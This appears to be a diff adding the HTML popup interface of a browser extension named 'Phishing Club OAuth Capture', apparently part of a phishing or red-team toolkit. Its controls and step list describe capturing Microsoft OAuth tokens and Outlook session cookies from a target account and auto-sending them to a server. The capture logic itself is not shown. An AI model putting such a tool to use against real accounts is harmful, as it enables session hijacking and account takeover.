@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phishing Club OAuth Capture</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      width: 380px;
+      min-height: 460px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
+      color: #333;
+    }
+    .header {
+      background: rgba(255,255,255,0.95);
+      padding: 16px;
+      text-align: center;
+      border-bottom: 3px solid #6366f1;
+    }
+    .header h1 { font-size: 17px; color: #6366f1; margin-bottom: 3px; }
+    .header p { font-size: 11px; color: #666; }
+    .card {
+      background: rgba(255,255,255,0.95);
+      margin: 8px;
+      padding: 14px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .card h3 { font-size: 13px; color: #6366f1; margin-bottom: 8px; }
+    .server-row { display: flex; gap: 6px; align-items: stretch; }
+    .server-row input {
+      flex: 1; padding: 8px 10px; border: 2px solid #ddd;
+      border-radius: 6px; font-size: 12px; outline: none; transition: border-color 0.2s;
+    }
+    .server-row input:focus { border-color: #6366f1; }
+    .btn {
+      padding: 8px 14px; border: none; border-radius: 6px;
+      cursor: pointer; font-size: 12px; font-weight: 600; color: white; transition: all 0.2s;
+    }
+    .btn:hover { transform: scale(1.03); }
+    .btn-connect { background: #4CAF50; }
+    .btn-connect.connected { background: #e74c3c; }
+    .btn-connect:disabled { background: #ccc; cursor: not-allowed; transform: none; }
+    .status-msg { margin-top: 6px; font-size: 11px; text-align: center; min-height: 16px; }
+    .status-msg.ok { color: #4CAF50; }
+    .status-msg.err { color: #e74c3c; }
+    .status-msg.info { color: #FF9800; }
+    .toggle-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 7px 0; border-bottom: 1px solid #f0f0f0;
+    }
+    .toggle-row:last-child { border-bottom: none; }
+    .toggle-label { font-weight: 600; color: #555; font-size: 13px; }
+    .toggle { position: relative; display: inline-block; width: 44px; height: 22px; }
+    .toggle input { opacity: 0; width: 0; height: 0; }
+    .slider {
+      position: absolute; cursor: pointer; inset: 0; background: #ccc;
+      transition: 0.3s; border-radius: 22px;
+    }
+    .slider::before {
+      content: ""; position: absolute; height: 16px; width: 16px;
+      left: 3px; bottom: 3px; background: white; transition: 0.3s; border-radius: 50%;
+    }
+    input:checked + .slider { background: #6366f1; }
+    input:checked + .slider::before { transform: translateX(22px); }
+    .tokens-list { max-height: 180px; overflow-y: auto; }
+    .token-item {
+      background: #f8f9fa; padding: 8px; margin-bottom: 6px;
+      border-radius: 5px; border-left: 3px solid #6366f1;
+    }
+    .token-item.sent { border-left-color: #4CAF50; }
+    .token-item.unsent { border-left-color: #FF9800; }
+    .token-time { font-size: 10px; color: #999; }
+    .token-code { font-family: monospace; font-size: 11px; color: #555; word-break: break-all; margin: 4px 0; }
+    .token-status { font-size: 10px; font-weight: bold; }
+    .token-status.ok { color: #4CAF50; }
+    .token-status.pending { color: #FF9800; }
+    .no-tokens { text-align: center; color: #999; padding: 16px; font-size: 13px; }
+    .tokens-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+    .btn-clear { background: #e74c3c; font-size: 11px; padding: 4px 12px; }
+    .btn-sm { background: #6366f1; font-size: 10px; padding: 3px 8px; margin-top: 4px; }
+    .oauth-input {
+      width: 100%; padding: 8px 10px; border: 2px solid #ddd;
+      border-radius: 6px; font-size: 12px; outline: none; margin-bottom: 6px; transition: border-color 0.2s;
+    }
+    .oauth-input:focus { border-color: #6366f1; }
+    .oauth-hint { font-size: 10px; color: #888; margin-bottom: 8px; }
+    .btn-oauth {
+      width: 100%; background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
+      padding: 10px; font-size: 13px; font-weight: 700; border-radius: 6px;
+    }
+    .btn-oauth:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    .step { font-size: 11px; color: #555; margin-top: 8px; line-height: 1.6; }
+    .step b { color: #6366f1; }
+    .btn-cookie {
+      width: 100%; background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
+      padding: 10px; font-size: 13px; font-weight: 700; border-radius: 6px;
+    }
+    .btn-cookie:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    .cookie-summary-header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 6px 0; font-size: 12px; font-weight: 600; color: #555;
+    }
+    .cookie-count { color: #FF9800; font-size: 16px; font-weight: 700; }
+    .cookie-domains { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 4px; }
+    .cookie-domain-tag {
+      display: inline-block; background: #fff3e0; color: #E65100;
+      padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 600;
+    }
+    .cookie-item {
+      background: #fff8e1; padding: 8px; margin-bottom: 6px;
+      border-radius: 5px; border-left: 3px solid #FF9800;
+    }
+    .cookie-item.sent { border-left-color: #4CAF50; }
+    .footer { text-align: center; padding: 8px; font-size: 10px; color: rgba(255,255,255,0.8); }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>Phishing Club OAuth Capture</h1>
+    <p>Automatic OAuth Token & Cookie Capture Extension</p>
+  </div>
+
+  <div class="card">
+    <h3>Server Connection</h3>
+    <div class="server-row">
+      <input type="text" id="serverUrl" placeholder="https://your-phishingclub-server.com">
+      <button class="btn btn-connect" id="connectBtn">Connect</button>
+    </div>
+    <div class="status-msg" id="statusMsg"></div>
+  </div>
+
+  <div class="card" id="oauthCard">
+    <h3>Start OAuth Capture</h3>
+    <input type="text" class="oauth-input" id="clientId" placeholder="Azure App Client ID">
+    <input type="text" class="oauth-input" id="tenantId" placeholder="Tenant ID (default: common)" value="common">
+    <p class="oauth-hint">From Azure Portal: App Registrations > Your App > Overview</p>
+    <button class="btn btn-oauth" id="startOAuthBtn">Open Microsoft Sign-In</button>
+    <div class="status-msg" id="oauthStatus"></div>
+    <div class="step">
+      <b>Step 1:</b> Enter your Azure Client ID above<br>
+      <b>Step 2:</b> Click "Open Microsoft Sign-In"<br>
+      <b>Step 3:</b> Sign in with the target Microsoft account<br>
+      <b>Step 4:</b> The extension auto-captures the token
+    </div>
+  </div>
+
+  <div class="card" id="cookieCard">
+    <h3>Cookie Capture</h3>
+    <p class="oauth-hint" style="margin-bottom: 10px;">Grab session cookies from Outlook / Microsoft. No Azure App needed - just be signed in.</p>
+    <button class="btn btn-cookie" id="captureCookiesBtn">Capture Outlook Cookies</button>
+    <div class="status-msg" id="cookieStatus"></div>
+    <div id="cookieSummary" style="display: none; margin-top: 10px;">
+      <div class="cookie-summary-header">
+        <span class="cookie-count" id="cookieCount">0</span> cookies from <span id="cookieDomainCount">0</span> domains
+        <button class="btn btn-sm" id="sendCookiesBtn" style="background: #4CAF50; float: right;">Send</button>
+      </div>
+      <div class="cookie-domains" id="cookieDomains"></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="toggle-row">
+      <label class="toggle-label" for="enabledToggle">Extension Enabled</label>
+      <label class="toggle" for="enabledToggle"><input type="checkbox" id="enabledToggle" checked><span class="slider"></span></label>
+    </div>
+    <div class="toggle-row">
+      <label class="toggle-label" for="autoCaptureToggle">Auto-Send to Server</label>
+      <label class="toggle" for="autoCaptureToggle"><input type="checkbox" id="autoCaptureToggle" checked><span class="slider"></span></label>
+    </div>
+    <div class="toggle-row">
+      <label class="toggle-label" for="notificationsToggle">Notifications</label>
+      <label class="toggle" for="notificationsToggle"><input type="checkbox" id="notificationsToggle" checked><span class="slider"></span></label>
+    </div>
+    <div class="toggle-row">
+      <span class="toggle-label">Captured Items</span>
+      <span style="color: #6366f1; font-weight: bold;" id="tokenCount">0</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="tokens-header">
+      <h3>Recent Captures</h3>
+      <button class="btn btn-clear" id="clearBtn">Clear All</button>
+    </div>
+    <div class="tokens-list" id="tokensList">
+      <div class="no-tokens">No tokens or cookies captured yet</div>
+    </div>
+  </div>
+
+  <div class="footer">Phishing Club Extension v1.0.0</div>
+  <script src="popup.js"></script>
+</body>
+</html>
